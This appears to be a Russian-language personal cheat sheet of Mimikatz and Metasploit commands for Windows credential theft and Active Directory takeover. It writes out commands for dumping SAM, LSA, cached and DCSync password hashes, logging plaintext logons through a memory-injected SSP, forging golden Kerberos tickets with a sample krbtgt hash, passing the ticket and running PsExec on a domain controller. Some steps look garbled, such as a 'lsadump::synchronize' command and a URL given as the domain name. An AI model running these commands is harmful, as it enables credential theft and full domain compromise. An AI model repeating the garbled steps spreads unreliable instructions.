# mimi

МИМИКАТЗ в метасплойт

use windows/x64/meterpreter_reverse_tcp

load kiwi
kiwi_cmd lsadump::sam

https://github.com/gentilkiwi/mimikatz/releases 

Как извлечь хеш пароля пользователя NTLM из файлов реестра


Если есть готвый стянуты файл sam  и system

.\mimikatz.exe

lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM

Если из памяти...
После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:

- `privilege::debug` - открывает привилегии отладки для текущего процесса.
- token::elevate - повышение привелегий
- `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
- `lsadump::sam` - вытягивает пароли из базы данных SAM.
- `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
- lsadump::lsa /patch Сбросьте эти хэши!!
- `token::elevate` - поднимает привилегии на максимальный уровень.
- `token::whoami` - выводит информацию о текущем пользователе.
-  lsadump::cache - mscash2 последних 10 пользователей из систем и секьюрити
- lsadump::dcsync /all /csv - дампим ntds.dit с контроллера
Подробнее: https://www.securitylab.ru/analytics/517178.php

Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:

1. Загрузите ntds.dit в память с помощью команды "lsadump::synchronize". Например:
```
mimikatz # lsadump::synchronize /system:C:\Windows\system32\config\system /ntds:C:\Windows\NTDS\ntds.dit
```

2. Используйте команду "lsadump::dcsync" для извлечения данных из базы данных ntds.dit. Например:
```
mimikatz # lsadump::dcsync /user:Administrator
```
где "Administrator" - это имя пользователя, данные которого вы хотите получить.


Если LSASS в виртуальном контейнере

privilege::debug
misc::memssp

и получаем после перелогина

c:\windows\system32\mimilsa.log

# Golden ticket  - Dump SID and KRBTGT hash (on DC) от АДМИНИСТРАТОРА

PS C:\pentst> .\mimikatz.exe

mimikatz # privilege::debug

mimikatz # token::elevate (DONT NEED THIS)

mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt)

# Create golden ticket (write to file in this case)
PS C:\Tools> .\mimikatz.exe
mimikatz # kerberos::purge

mimikatz # kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:golden

# Super golden ticket
kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:corp_super_golden /endin:2147483647

# Inject ticket to memory
C:\Tools> mimikatz.exe
mimikatz # kerberos::ptt golden

# PsExec to DC
PsExec64.exe \\dc01 cmd.exe
